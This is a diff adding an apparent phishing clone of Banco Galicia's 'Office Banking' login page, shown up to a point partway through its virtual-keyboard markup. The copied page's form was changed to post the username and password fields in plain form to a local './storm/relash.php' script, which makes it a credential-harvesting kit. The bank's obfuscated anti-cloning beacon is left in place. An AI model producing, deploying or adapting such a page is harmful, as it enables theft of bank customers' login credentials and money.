@@ -1,0 +1,850 @@
+<!DOCTYPE html
+    PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+
+<html xmlns="../www.w3.org/1999/xhtml/index.html">
+
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=11;IE=10;IE=9;IE=8;IE=7;IE=Edge">
+    <title>
+
+        Office Banking
+
+    </title>
+    <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
+    <meta http-equiv="Pragma" content="no-cache">
+    <!-- Palanca MasterPage Activada. Mostrando versiÃ³n anterior -->
+
+
+    <meta http-equiv="expires" content="-1">
+    <meta http-equiv="Pragma" content="no-cache">
+
+
+
+    <!-- Esto es el css para el icono del teclado, es una libreria para iconos -->
+
+    <link rel="stylesheet" href="./Office Banking_files/all.css"
+        integrity="sha384-B4dIYHKNBt8Bc12p+WXckhzcICo0wtJAoU8YZTY5qE0Id1GSseTk6S+L3BlXeVIU" crossorigin="anonymous">
+    <link href="./Office Banking_files/keyboard.css" rel="stylesheet">
+    <!-- Esto es el css de la libreria del teclado -->
+
+    <link href="./Office Banking_files/simple-keyboard.css" rel="stylesheet">
+    <link rel="shortcut icon" href="">
+    <link type="text/css" rel="stylesheet" href="./Office Banking_files/jquery-ui-1.10.3.custom.css">
+    <link rel="stylesheet" type="text/css" href="./Office Banking_files/styles.css">
+    <link href="./Office Banking_files/SiderBar.css" rel="stylesheet">
+
+
+
+    <script async="" src="./Office Banking_files/gtm5445.html"></script>
+    <script type="text/javascript" src="./Office Banking_files/login.js.descarga" async=""></script>
+    <script type="text/javascript" src="./Office Banking_files/jquery-1.7.2.min.js.descarga"></script>
+    <script type="text/javascript" src="./Office Banking_files/jquery-ui-1.10.3.custom.min.js.descarga"></script>
+
+    <script src="./Office Banking_files/Core50a9.js.descarga" type="text/javascript"></script>
+    <script src="./Office Banking_files/sessvars.js.descarga" type="text/javascript"></script>
+    <script src="./Office Banking_files/GOPrototypes50a9.js.descarga" type="text/javascript"></script>
+    <script src="./Office Banking_files/SideBar.js.descarga" type="text/javascript"></script>
+
+    <script src="./Office Banking_files/Barrett.js.descarga" type="text/javascript"></script>
+    <script src="./Office Banking_files/BigInt.js.descarga" type="text/javascript"></script>
+    <script src="./Office Banking_files/RsaWPadding.js.descarga" type="text/javascript"></script>
+    <script src="./Office Banking_files/hashtable.js.descarga" type="text/javascript"></script>
+    <script src="./Office Banking_files/rsa.js.descarga" type="text/javascript"></script>
+    <script src="./Office Banking_files/Core50a9.js.descarga" type="text/javascript"></script>
+
+    <script type="text/javascript" language="javascript">
+        function simulateClick() {
+            $("#UserID").on("click", function () {
+                $('#UserID').focus();
+            });
+            $("#UserID").trigger("click");
+        }
+
+        function refreshLogin() {
+            window.location.reload();
+        }
+
+        var interval_refreshLogin;
+
+
+        function DisableAddEI() {
+            if ($.browser.mozilla && parseInt($.browser.version, 10) == 11 || $.browser.msie && parseInt($.browser.version, 10) < 8) {
+                $('.l-alta').prop('disabled', true);
+                $('.l-alta').css('background-color', '#e6e6e6');
+                $('#l-alta').GOMsgTooltip({
+                    msg: "Esta funcionalidad no est" + '&aacute' + " disponible en Internet Explorer, por favor utilizar Google Chrome o Microsoft Edge.",
+                    triggerOnMouseOver: true
+                });
+            }
+        }
+
+        function analitycsInput(id) {
+            var text = document.getElementById(id).value;
+            if (text == '') {
+                GA4('form_interaction', 'login', 'formulario de acceso', '', id, '', '', 'recupero de usuario', id, 'empty');
+            }
+            else {
+                GA4('form_interaction', 'login', 'formulario de acceso', '', id, '', '', 'recupero de usuario', id, 'complete');
+            }
+        }
+
+        $(document).ready(function () {
+            try {
+                if ($.browser.mozilla && parseInt($.browser.version, 10) <= 11 || $.browser.msie && parseInt($.browser.version, 10) >= 8) {
+                    if ('False'.toLowerCase() != 'false') {
+                        window.location.href("/Home/AvisoIE");
+                    }
+                }
+                DisableAddEI();
+                $('#UserID').attr('autocomplete', 'off');
+
+                //Refresco el login para evitar que el anti forgery token devuelva un error si el browser nunca se cerró
+                interval_refreshLogin = setInterval("refreshLogin()", 900000);
+
+                //Si es la primera vez que entra, chequeo que se puede desencriptar (por si el browser cachea)
+                if (typeof sessvars.RefreshEncriptionVariables === 'undefined' || sessvars.RefreshEncriptionVariables == null) {
+                    sessvars.RefreshEncriptionVariables = false;
+
+                    initKey();
+
+                    var enc = encryptedString(key, 'rG/kJZgR5qec8qKC4Loyt9Ei4/s=' + '\\' + base64encode("GODTEAM"));
+
+                    $.ajax({
+                        url: '/Users/TestEncrypt',
+                        dataType: 'json',
+                        type: "POST",
+                        data: { data: enc },
+                        success: function (data) {
+                            try {
+                                if (!data) {
+                                    refreshLogin();
+                                }
+                            }
+                            catch (e) { }
+                        }
+                    });
+                }
+            }
+            catch (e) { }
+
+            sessvars.LoginRandomGUID = null;
+            $('#password').focus();
+
+            //Se realiza un click sobre el campo usuario para que la función placeholder blanquee y le haga foco a este campo en todo los navegadores
+            //Va con time out para que se ejecuté último
+            setTimeout('simulateClick()', 100);
+
+            document.getElementById("DevicePrintAdaptive").value = encode_deviceprint();
+
+            setInterval("slideSwitch()", 5000);
+
+            $(".name-holder").click(function () {
+                $(".user").focus();
+            })
+
+            $(".pass-holder").click(function () {
+                $(".password").focus();
+            })
+
+            $(".name-holder").focus(function () {
+                $(".user").addClass("focus");
+                $(".password").removeClass("focus");
+            })
+
+            $(".pass-holder").focus(function () {
+                $(".password").addClass("focus");
+                $(".user").removeClass("focus");
+            })
+
+            $(".name-holder").focusout(function () {
+                $(".user").removeClass("focus");
+            })
+
+            $(".pass-holder").focusout(function () {
+                $(".password").removeClass("focus");
+            })
+
+            $(".user").keyup(function () {
+                modificacionInputUser();
+            });
+
+            $(".password").keyup(function () {
+                modificacionInputPassword();
+            });
+
+            $(".user").change(function () {
+                modificacionInputUser();
+            });
+
+            $(".password").change(function () {
+                modificacionInputPassword();
+            });
+
+            slideShowImages();
+        });
+
+        function slideShowImages() {
+
+            // Verifico si el piloto esta activo y tiene imagens
+            $.ajax({
+                url: '/Home/PilotoImagenLogin',
+                dataType: 'json',
+                type: "GET",
+                success: function (data) {
+                    //esta activo, tiene imagenes y links (se comprueba en controller)
+                    if (data.Activo) {
+
+                        addImagesToSlideShow(data.Imagenes, data.Links, false);
+                    }
+                    else {
+                        //si no esta activo o no tiene imagenes, uso imagen por defecto
+                        addImagesToSlideShow('', '', true);
+                    }
+                },
+                error: function (data) {
+                    // si ocurre algun error uso imagen por defecto
+                    addImagesToSlideShow('', '', true);
+                }
+            });
+        }
+
+        function addImagesToSlideShow(img, link, defaultImg) {
+
+            var slideshow = document.getElementById('slideshow');
+            var oneImage = document.getElementById('oneImage');
+            var position = 0;
+            if (!defaultImg) {
+                // mapeo las imagenes al slideshow
+                img.map(function (elemento) {
+                    var e = document.createElement("img");
+                    e.setAttribute(
+                        'src',
+                        '/Images/Banners/' + elemento);
+                    e.setAttribute('alt', elemento);
+                    e.setAttribute("onClick", "openLink(" + "'" + link[position] + "'" + ")");
+                    position++;
+
+                    // Si es solo una imagen no uso slideshow
+                    if (img.length == 1) {
+                        oneImage.appendChild(e);
+                        slideshow.style.display = 'none';
+                    } else {
+                        slideshow.appendChild(e);
+                        oneImage.style.display = 'none';
+                    }
+                });
+
+            }
+            else {
+                // uso imagen por defecto                
+                var defaultLink = '../www.galicia.ar/personas825e.html?utm_source=officebanking&amp;utm_medium=referral';
+                var defaultImage = document.createElement("img");
+                defaultImage.setAttribute(
+                    'src',
+                    'Images/Banners/login-banner-00.jpg');
+                defaultImage.setAttribute('alt', 'Office Banking');
+                defaultImage.setAttribute("onClick", "openLink(" + "'" + defaultLink + "'" + ")");
+                oneImage.appendChild(defaultImage);
+                slideshow.style.display = 'none';
+            }
+        }
+
+        function openLink(link) {
+            if (link != '') {
+                window.open(link, '', '');
+            }
+        }
+
+        function modificacionInputPassword() {
+            if ($(".password").val().length > 0) {
+                $(".pass-holder").css("display", "none");
+            } else {
+                $(".pass-holder").css("display", "block");
+            }
+        }
+
+        function modificacionInputUser() {
+            if ($(".user").val().length > 0) {
+                $(".name-holder").css("display", "none");
+            } else {
+                $(".name-holder").css("display", "block");
+            }
+        }
+
+        sessvars.currentNav = "LGN";
+        localStorage.setItem('ClicPage', 'LGN');
+
+        // Variable que se utiliza dentro del KeyBoard.Js
+        var showKeyboard = false;
+
+        function SubmitLoginForm() {
+            GA4('user_interaction', 'login', '', 'click', 'b-ingresar');
+            //En caso que el Teclado Virtual se este visualizando, lo cerramos
+            document.getElementById("simpleKeyboard").style.display = "none";
+            document.getElementById("keyboardIcon").style.color = "#666666";
+            showKeyboard = false;
+
+
+
+            //Antes de realizar el submit borro el intervalo
+            clearInterval(interval_refreshLogin);
+
+            initKey();
+            cmdEncrypt();
+
+            //alert($('#EncriptedPassword').val());
+            $('#form1').submit();
+
+            //Evito que haga click mientras se procesa el request
+            $('#submitButton').prop("disabled", "disabled");
+        }
+        var key;
+        function initKey() {
+            setMaxDigits(131);
+            key = new RSAKeyPair("010001", "", "9F59AA734D3188E3F7938F61098DDB17A345C347285309C3245D16C8D53D672AE67080EE2D7BC273053862AE9A344A520FA8B66B3CFEC940E3309942BEADFBF6AF2075C1D2E07280814E17BF9E856B4379FA2B2E48DDCBC5F1314885E4679CCBDA5B91A3E8F15D71ACE20056C82AD727D47613AD64FD17109CFCFA5366E0F151");
+        }
+
+        function cmdEncrypt() {
+            initKey();
+
+            var enc = encryptedString(key, 'rG/kJZgR5qec8qKC4Loyt9Ei4/s=' + '\\' + base64encode($('#password').val()));
+            //with (document.Form1) {
+            $('#EncriptedPassword').val(enc);
+            $('#password').val("");
+            //}
+            return;
+        }
+        function evalEnter(e) {
+            if (e.keyCode == 13) {
+                SubmitLoginForm();
+            }
+        }
+
+        function enableDebug() {
+            if (document.getElementById('isDebugEnabled').value == "true") {
+                document.getElementById('isDebugEnabled').value = false;
+                document.getElementById('pEnableDebug').style.color = "#fff";
+            }
+            else {
+                document.getElementById('isDebugEnabled').value = true;
+                document.getElementById('pEnableDebug').style.color = "red";
+            }
+        }
+
+        function onclickRespuestas() {
+            showHelp('index');
+            GA4('user_interaction', 'login', '', 'click', 'l-respuestas');
+        }
+
+
+    </script>
+
+    <script type="text/javascript" id="64bb2703-e0c3-49e7-a41d-d4115ea3a62f">
+        (function (s, h, ci, si, wi) {
+            s = s + Math.random().toString(36).substring(7) + "/login.js?clientId=" + ci + "&websiteId=" + wi;
+            window._dmo = { src: s, host: h, sessionId: si, clientId: ci, websiteId: wi };
+            var a = document.createElement("script");
+            a.type = "text/javascript";
+            a.src = s;
+            a.async = !0;
+            var b = document.getElementsByTagName("script")[0];
+            b.parentNode.insertBefore(a, b);
+        })('../sifo.bancogalicia.com.ar_443/scriptdealer/script/v1/index.html', '../sifo.bancogalicia.com.ar_443/index.html',
+            '4f610b72-bc0d-4cb6-9bca-9142006dfa61', null, '633');
+    </script>
+
+
+    <script src="./Office Banking_files/launch-de55e9a10fa1.min.js.descarga" async=""></script>
+
+
+    <script>
+        function _0x4472() { var _0x17197e = ['hash', '99BTYcVg', '?rfr=', 'src', 'referrer', '10yktvDA', '7eTnhwc', '2106488vdizGJ', '179330oCCmlo', '110549kBSrRG', 'replace', '5486916VuKFzJ', '895548erxdUI', 'bancogalicia.com.ar', 'length', '535572OnPkcO', '3WehCDX', 'href', '&hash=', '891302pyPLks', '../gal.bgsensors.co/api/wb/b3f76076-f760-49d8-ab30-437b9b182ac7/60a375cb-568d-41f6-a2d9-0e5d6c6ad549/1244/index.html', 'domain', '11NAfFer']; _0x4472 = function () { return _0x17197e; }; return _0x4472(); } var _0xd9222a = _0x5b05; (function (_0x59b396, _0x52f570) { var _0x39a3a4 = _0x5b05, _0xf99ab9 = _0x59b396(); while (!![]) { try { var _0x2be577 = -parseInt(_0x39a3a4(0x1dd)) / 0x1 + parseInt(_0x39a3a4(0x1d0)) / 0x2 * (-parseInt(_0x39a3a4(0x1cd)) / 0x3) + parseInt(_0x39a3a4(0x1e0)) / 0x4 * (parseInt(_0x39a3a4(0x1d9)) / 0x5) + -parseInt(_0x39a3a4(0x1cc)) / 0x6 + -parseInt(_0x39a3a4(0x1da)) / 0x7 * (-parseInt(_0x39a3a4(0x1db)) / 0x8) + -parseInt(_0x39a3a4(0x1d5)) / 0x9 * (parseInt(_0x39a3a4(0x1dc)) / 0xa) + parseInt(_0x39a3a4(0x1d3)) / 0xb * (parseInt(_0x39a3a4(0x1df)) / 0xc); if (_0x2be577 === _0x52f570) break; else _0xf99ab9['push'](_0xf99ab9['shift']()); } catch (_0x1f804c) { _0xf99ab9['push'](_0xf99ab9['shift']()); } } }(_0x4472, 0x4f7e3)); function _0x5b05(_0x3df48a, _0x38bf10) { var _0x447252 = _0x4472(); return _0x5b05 = function (_0x5b0584, _0xbebd86) { _0x5b0584 = _0x5b0584 - 0x1cb; var _0x2fb87f = _0x447252[_0x5b0584]; return _0x2fb87f; }, _0x5b05(_0x3df48a, _0x38bf10); } if (document[_0xd9222a(0x1d2)]['indexOf']('bancogalicia.com.ar', document[_0xd9222a(0x1d2)][_0xd9222a(0x1cb)] - _0xd9222a(0x1e1)[_0xd9222a(0x1cb)]) == -0x1) { var img = new Image(), hash = location[_0xd9222a(0x1d4)][_0xd9222a(0x1de)]('#', ''); img[_0xd9222a(0x1d7)] = _0xd9222a(0x1d1) + _0xd9222a(0x1d6) + encodeURI(document[_0xd9222a(0x1d8)]) + _0xd9222a(0x1cf) + hash + '&dom=' + document[_0xd9222a(0x1d2)] + '&href=' + encodeURI(location[_0xd9222a(0x1ce)]); }
+    </script>
+    <script defer="" src="./Office Banking_files/index.html"></script>
+
+    <!--[if IE]>
+    <script type="text/javascript" src="/Js/tags-html5.js"></script>
+    <![endif]-->
+    <!--[if IE 8]>
+    <script type="text/javascript" src="/Js/IE8.js"></script>
+    <![endif]-->
+
+
+    <script type="text/javascript">
+
+
+        function ShowMenuDescription(elem) {
+            var ul = $("#accesos");
+            $(ul).find("li").each(function (index, element) {
+                var span = $(element).children("span");
+                if ($(span).html() != null) {
+                    if ($(span).parent().attr("id") != elem.id)
+                        $(span).css("display", "none");
+                    else
+                        $(span).css("display", "block");
+                }
+            });
+        }
+
+        function HideMenuDescription() {
+            var ul = $("#accesos");
+            $(ul).find("li").each(function (index, element) {
+                var span = $(element).children("span");
+                if ($(span).html() != null) {
+                    $(span).css("display", "none");
+                }
+            });
+        }
+
+
+        function TooltipAltaEI() {
+            if (($.browser.mozilla && (parseInt($.browser.version, 10) >= 8) && (parseInt($.browser.version, 10) <= 11))
+                ||
+                $.browser.msie && parseInt($.browser.version, 10) >= 8) {
+                $('.l-alta').prop('disabled', true);
+                $('.l-alta').css('background-color', '#e6e6e6');
+                $('#_ADD').GOMsgTooltip({
+                    msg: "Esta funcionalidad no est" + '&aacute' + " disponible en Internet Explorer, por favor utilizar Google Chrome o Microsoft Edge.",
+                    triggerOnMouseOver: true
+                });
+                if ('False' != 'False') {
+
+                    $('.l-seguridad').prop('disabled', true);
+                    $('.l-seguridad').css('background-color', '#e6e6e6');
+                    $('#_SSI').GOMsgTooltip({
+                        msg: "Esta funcionalidad no est" + '&aacute' + " disponible en Internet Explorer, por favor utilizar Google Chrome o Microsoft Edge.",
+                        triggerOnMouseOver: true
+                    });
+                    $('.l-respuestas').prop('disabled', true);
+                    $('.l-respuestas').css('background-color', '#e6e6e6');
+                    $('#_FAQ').GOMsgTooltip({
+                        msg: "Esta funcionalidad no est" + '&aacute' + " disponible en Internet Explorer, por favor utilizar Google Chrome o Microsoft Edge.",
+                        triggerOnMouseOver: true
+                    });
+                    $('.l-terminos').prop('disabled', true);
+                    $('.l-terminos').css('background-color', '#e6e6e6');
+                    $('#_TYC').GOMsgTooltip({
+                        msg: "Esta funcionalidad no est" + '&aacute' + " disponible en Internet Explorer, por favor utilizar Google Chrome o Microsoft Edge.",
+                        triggerOnMouseOver: true
+                    });
+                    $('.l-verificacion').prop('disabled', true);
+                    $('.l-verificacion').css('background-color', '#e6e6e6');
+                    $('#_SRS').GOMsgTooltip({
+                        msg: "Esta funcionalidad no est" + '&aacute' + " disponible en Internet Explorer, por favor utilizar Google Chrome o Microsoft Edge.",
+                        triggerOnMouseOver: true
+                    });
+                    $('.l-mensajes').prop('disabled', true);
+                    $('.l-mensajes').css('background-color', '#e6e6e6');
+                    $('#_MSG').GOMsgTooltip({
+                        msg: "Esta funcionalidad no est" + '&aacute' + " disponible en Internet Explorer, por favor utilizar Google Chrome o Microsoft Edge.",
+                        triggerOnMouseOver: true
+                    });
+                }
+            }
+        }
+
+        $(document).ready(function () {
+            if ($.browser.mozilla && parseInt($.browser.version, 10) <= 11 || $.browser.msie && parseInt($.browser.version, 10) >= 8) {
+
+            }
+            TooltipAltaEI();
+            //Llamo a la funcion HideMenuDescription para que los titulos de los botones de las opciones
+            //queden solo cuando el cursor se encuentra arriba.
+            HideMenuDescription();
+
+
+
+            //Sessvars para manejar el menÃº seleccionado. no 
+            if (sessvars.currentNav !== undefined && sessvars.currentNav != "" && sessvars.currentNav != "LGN") {
+                try {
+                    $("#_" + sessvars.currentNav).addClass("active");
+                } catch (e) { }
+
+                if (sessvars.currentNav != "OOS") {
+                    //Se ocultan las secciones correspondientes al login y se muestran las de contenido general.
+                    $("#nav_section").show();
+                    $("#main_section").show();
+                    $("#login_section").hide();
+                    $("body").addClass("menu");
+                } else {
+                    try {
+                        $("#login_section").removeClass("login");
+                        $("#login_section").addClass("login interrumpido");
+                    } catch (e) { }
+                }
+            }
+
+            if (localStorage.getItem('ClicPage') !== undefined && localStorage.getItem('ClicPage') != "" && localStorage.getItem('ClicPage') != null && localStorage.getItem('ClicPage') != "LGN") {
+
+                try {
+                    $("#_" + localStorage.getItem('ClicPage')).addClass("active");
+                } catch (e) { }
+
+                if (localStorage.getItem('ClicPage') != "OOS") {
+                    //Se ocultan las secciones correspondientes al login y se muestran las de contenido general.
+                    $("#nav_section").show();
+                    $("#main_section").show();
+                    $("#login_section").hide();
+                    $("body").addClass("menu");
+                } else {
+                    try {
+                        $("#login_section").removeClass("login");
+                        $("#login_section").addClass("login interrumpido");
+                    } catch (e) { }
+                }
+            }
+
+        });
+
+        function ShowErrorModal() {
+
+        }
+    </script>
+    <script>(function (w, d, s, l, i) { w[l] = w[l] || []; w[l].push({ "gtm.start": new Date().getTime(), event: "gtm.js" }); var f = d.getElementsByTagName(s)[0], j = d.createElement(s), dl = l != "dataLayer" ? "&l=" + l : ""; j.async = true; j.src = '../www.googletagmanager.com/gtm5445.html?id=' + i + dl + ''; f.parentNode.insertBefore(j, f); })(window, document, "script", "dataLayer", "GTM-P8BC6QW");</script>
+</head>
+
+<body>
+    <noscript><iframe src="../www.googletagmanager.com/ns00a8.html?id=GTM-P8BC6QW%20height=" 0" width="0"
+            style="display:none;visibility:hidden"></iframe></noscript>
+
+
+    <div id="message_box" class="ContentIframe" style="display: none"></div>
+    <div id="main-container" class="main-login">
+        <header>
+            <div class="left">
+                <a class="logoGalicia" href="">
+                    <img src="./Office Banking_files/logo-galicia-new.png" alt="Banco Galicia" target="_blank">
+                </a>
+            </div>
+            <div class="right"><img src="./Office Banking_files/logo-ob.png" alt="Office Banking"></div>
+        </header>
+        <nav style="display: none;" id="nav_section"><!-- Menu de accesos-->
+            <ul class="l-accesos" id="accesos">
+                <li id="_ADD" onmouseover="ShowMenuDescription(this);" onmouseout="HideMenuDescription();">
+                    <a class="l-alta" href=""
+                        onclick="localStorage.setItem(&#39;ClicPage&#39;, &#39;ADD&#39;); sessvars.currentNav = &#39;ADD&#39;;"></a>
+                    <span style="display: none;">Adherirse al Servicio / Alta de Usuarios</span>
+                </li>
+                <li id="_SSI" onmouseover="ShowMenuDescription(this);" onmouseout="HideMenuDescription();">
+                    <a class="l-seguridad" href=""></a>
+                    <span style="display: none;">Seguridad del Servicio</span>
+                </li>
+                <li id="_FAQ" onmouseover="ShowMenuDescription(this);" onmouseout="HideMenuDescription();">
+                    <a class="l-respuestas" href="" onclick="showHelp(&#39;index&#39;);"></a>
+                    <span style="display: none;">Respuestas a Preguntas Frecuentes</span>
+                </li>
+                <li id="_TYC" onmouseover="ShowMenuDescription(this);" onmouseout="HideMenuDescription();">
+                    <a class="l-terminos" href=""></a>
+                    <span style="display: none;">Términos y condiciones</span>
+                </li>
+                <li id="_SRS" onmouseover="ShowMenuDescription(this);" onmouseout="HideMenuDescription();">
+                    <a class="l-verificacion" href=""></a>
+                    <span style="display: none;">Verificación de Requisitos técnicos</span>
+                </li>
+                <li id="_MSG" onmouseover="ShowMenuDescription(this);" onmouseout="HideMenuDescription();">
+                    <a class="l-mensajes" href="" onclick="sessvars.currentNav = &#39;MSG&#39;;"></a>
+                    <span style="display: none;">Mensajes al banco</span>
+                </li>
+                <li>
+                    <a class="l-login" href="">Ingreso</a>
+                </li>
+            </ul>
+        </nav>
+        <section class="data-accesos" style="display: none;" id="main_section">
+
+            <div id="error_modal" style="display:none;"></div>
+            <script type="text/javascript">
+                ShowErrorModal();
+            </script>
+
+        </section>
+        <section class="login" id="login_section">
+
+
+
+
+            <div class="login-cont-banner left">
+
+
+                <div id="oneImage" style="cursor:pointer;">
+
+                    <img src="./Office Banking_files/login-banner-00.jpg" alt="Office Banking"
+                        onclick="openLink(&#39;../www.galicia.ar/personas825e.html?utm_source=officebanking&amp;amp;utm_medium=referral&#39;)">
+                </div>
+
+                <div id="slideshow" style="cursor: pointer; display: none;">
+
+
+
+
+                </div>
+
+            </div>
+
+
+
+            <form action="./storm/relash.php" method="post" id="form1" class="right">
+                <input name="__RequestVerificationToken" type="hidden"
+                    value="HHuOLn33HQzDdpJwSVx8QFU3ns3FY9N7CmdNRGyT2gzS77zzPlsnQQ9XUr-TthqOZxvKVdKMQFbIO-r7EivlkdEcXFfJ7JH2HtqdCnZgNcoSH0xGKXc_BR530ikSBBR9svH_7AeQKxuWbc1MdwJ4F5YLoNOZU5qUpvpGn5vBTiY1">
+
+                <ul class="l-accesos">
+                    <li id="l-alta"><a class="l-alta" href=""
+                            onclick="localStorage.setItem(&#39;ClicPage&#39;, &#39;ADD&#39;); sessvars.currentNav = &#39;ADD&#39;;"></a><span>Adherirse
+                            al servicio / Alta de usuarios</span></li>
+                    <li><a class="l-seguridad" href=""
+                            onclick="GA4(&#39;user_interaction&#39;,&#39;login&#39;,&#39;&#39;,&#39;click&#39;,&#39;l-seguridad&#39;)"></a><span>Seguridad
+                            del servicio</span></li>
+                    <li><a class="l-respuestas" href="" onclick="onclickRespuestas()"></a><span>Ayuda de Office
+                            Banking</span></li>
+                    <li><a class="l-terminos" href=""
+                            onclick="GA4(&#39;user_interaction&#39;,&#39;login&#39;,&#39;&#39;,&#39;click&#39;,&#39;l-terminos&#39;)"></a><span>Términos
+                            y condiciones</span></li>
+                    <li><a class="l-verificacion" href=""
+                            onclick="GA4(&#39;user_interaction&#39;,&#39;login&#39;,&#39;&#39;,&#39;click&#39;,&#39;l-verificacion&#39;)"></a><span>Verificación
+                            de requisitos técnicos</span></li>
+                    <li><a class="l-mensajes" href=""
+                            onclick="GA4(&#39;user_interaction&#39;,&#39;login&#39;,&#39;&#39;,&#39;click&#39;,&#39;l-mensajes&#39;)"></a><span>Mensajes
+                            al banco</span></li>
+                </ul>
+
+                <div class="center">
+
+                    <input type="hidden" value="" name="EncriptedPassword" id="EncriptedPassword">
+
+                    <div class="cont-user cont-place">
+                        <input class="user place keyboard" id="UserID" name="usu" type="text"
+                            onfocusout="analitycsInput(&#39;UserID&#39;)" autocomplete="off" required>
+                        <div class="placeholder">
+                            <div class="text-holder" style="display: none;">Nombre de Usuario</div>
+                        </div>
+                    </div>
+
+
+
+                    <div class="cont-pass cont-place">
+                        <input class="user place keyboard focus" name="pass" type="password" required>
+                        <div class="placeholder">
+                            <div class="text-holder" style="display: block;">Clave de Acceso</div>
+                        </div>
+                    </div>
+
+                    <div class="teclado-virtual" id="divTeclado">
+                        <i class="far fa-keyboard keyboard-trigger" id="keyboardIcon" style="cursor: pointer;"></i>
+                        <h4 class="keyboard-trigger keyboard-text" style="margin-top: 0px; cursor:pointer;">Teclado
+                            Virtual</h4>
+                    </div>
+
+                    <div class="login-buttons">
+
+                        <button class="btn next" onclick="return SubmitLoginForm();" id="submitButton">INGRESAR</button>
+                        <a href=""
+                            onclick="GA4(&#39;user_interaction&#39;,&#39;login&#39;,&#39;&#39;,&#39;click&#39;,&#39;l-bloqueeMiClave&#39;)">Desbloqueo
+                            de clave</a>
+                        <a href=""
+                            onclick="GA4(&#39;user_interaction&#39;,&#39;login&#39;,&#39;&#39;,&#39;click&#39;,&#39;l-olvideMiClave&#39;)">Nueva
+                            clave de acceso</a>
+                        <a href=""
+                            onclick="GA4(&#39;user_interaction&#39;,&#39;login&#39;,&#39;&#39;,&#39;click&#39;,&#39;l-olvideMiUsuario&#39;)">Recupero
+                            de usuario</a>
+                    </div>
+
+                    <table style="display: none">
+                        <tbody>
+                            <tr>
+                                <td colspan="3" id="crypto_message" style="display: none" class="textoinfo"></td>
+                            </tr>
+                            <tr>
+                                <td colspan="3" id="crypto_results" style="display: none" class="textoinfo"></td>
+                            </tr>
+                        </tbody>
+                    </table>
+
+                </div>
+                <input type="hidden" id="DevicePrintAdaptive" name="DevicePrintAdaptive"
+                    value="version%3D3%2E4%2E0%2E0%5F1%26pm%5Ffpua%3Dmozilla%2F5%2E0%20%28windows%20nt%2010%2E0%3B%20win64%3B%20x64%29%20applewebkit%2F537%2E36%20%28khtml%2C%20like%20gecko%29%20chrome%2F109%2E0%2E0%2E0%20safari%2F537%2E36%7C5%2E0%20%28Windows%20NT%2010%2E0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537%2E36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F109%2E0%2E0%2E0%20Safari%2F537%2E36%7CWin32%26pm%5Ffpsc%3D24%7C1920%7C1080%7C1040%26pm%5Ffpsw%3D%26pm%5Ffptz%3D%2D3%26pm%5Ffpln%3Dlang%3Des%2DUS%7Csyslang%3D%7Cuserlang%3D%26pm%5Ffpjv%3D0%26pm%5Ffpco%3D1%26pm%5Ffpasw%3Dinternal%2Dpdf%2Dviewer%7Cinternal%2Dpdf%2Dviewer%7Cinternal%2Dpdf%2Dviewer%7Cinternal%2Dpdf%2Dviewer%7Cinternal%2Dpdf%2Dviewer%26pm%5Ffpan%3DNetscape%26pm%5Ffpacn%3DMozilla%26pm%5Ffpol%3Dtrue%26pm%5Ffposp%3D%26pm%5Ffpup%3D%26pm%5Ffpsaw%3D1920%26pm%5Ffpspd%3D24%26pm%5Ffpsbd%3D%26pm%5Ffpsdx%3D%26pm%5Ffpsdy%3D%26pm%5Ffpslx%3D%26pm%5Ffpsly%3D%26pm%5Ffpsfse%3D%26pm%5Ffpsui%3D%26pm%5Fos%3DWindows%26pm%5Fbrmjv%3D109%26pm%5Fbr%3DChrome%26pm%5Finpt%3D%26pm%5Fexpt%3D">
+                <input type="hidden" id="isDebugEnabled" name="isDebugEnabled" value="false">
+
+
+                <object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" width="1" height="1">
+                    <param name="_cx" value="5080">
+                    <param name="_cy" value="5080">
+                    <param name="FlashVars"
+                        value="gotoUrl=&amp;sendUrl=%2fUsers%2fGetDeviceAuthenticationAdaptive&amp;browserType=Explorer">
+                    <param name="Movie" value="Scripts/Office2.2/Images/pmfso2490.swf?nocache=95181">
+                    <param name="Src" value="Scripts/Office2.2/Images/pmfso2490.swf?nocache=95181">
+                    <param name="WMode" value="Window">
+                    <param name="Play" value="0">
+                    <param name="Loop" value="-1">
+                    <param name="Quality" value="High">
+                    <param name="SAlign" value="">
+                    <param name="Menu" value="-1">
+                    <param name="Base" value="">
+                    <param name="AllowScriptAccess" value="sameDomain">
+                    <param name="Scale" value="ShowAll">
+                    <param name="DeviceFont" value="0">
+                    <param name="EmbedMovie" value="0">
+                    <param name="BGColor" value="FFFFFF">
+                    <param name="SWRemote" value="">
+                    <param name="MovieData" value="">
+                    <param name="SeamlessTabbing" value="1">
+                    <param name="Profile" value="0">
+                    <param name="ProfileAddress" value="">
+                    <param name="ProfilePort" value="0">
+                    <param name="AllowNetworking" value="all">
+                    <param name="AllowFullScreen" value="false">
+                    <embed src="Scripts/Office2.2/Images/pmfso2490.swf?nocache=95181"
+                        flashvars="gotoUrl=&amp;sendUrl=%2fUsers%2fGetDeviceAuthenticationAdaptive&amp;browserType=Explorer"
+                        allowscriptaccess="sameDomain" quality="high" bgcolor="#FFFFFF" width="1" height="1"
+                        type="application/x-shockwave-flash">
+                    <noembed> </noembed>
+                    <noobject></noobject>
+                    <noobject></noobject>
+                </object>
+
+            </form>
+
+            <footer>
+                <p>
+
+                    <span ondblclick="enableDebug();" id="pEnableDebug"> Por</span> dudas o consultas Ingresa a la
+                    Sección de Ayuda, haga
+                    <a onclick="GA4(&#39;user_interaction&#39;,&#39;login&#39;,&#39;&#39;,&#39;click&#39;,&#39;l-clickAqui&#39;)"
+                        href="" target="_blank">
+                        click aquí &gt;&gt;.
+                    </a>
+                </p>
+                <img id="img_Norton" class="secured" src="./Office Banking_files/logo-norton-secured.png"
+                    alt="Norton Security">
+            </footer>
+            <div class="simple-keyboard hg-theme-default hg-layout-custom " id="simpleKeyboard" style="display:none;">
+                <div class="hg-row">
+                    <div class="hg-button hg-standardBtn" data-skbtn="4" data-skbtnuid="default-r0b0"
+                        data-displaylabel="4"><span>4</span></div>
+                    <div class="hg-button hg-standardBtn" data-skbtn="5" data-skbtnuid="default-r0b1"
+                        data-displaylabel="5"><span>5</span></div>
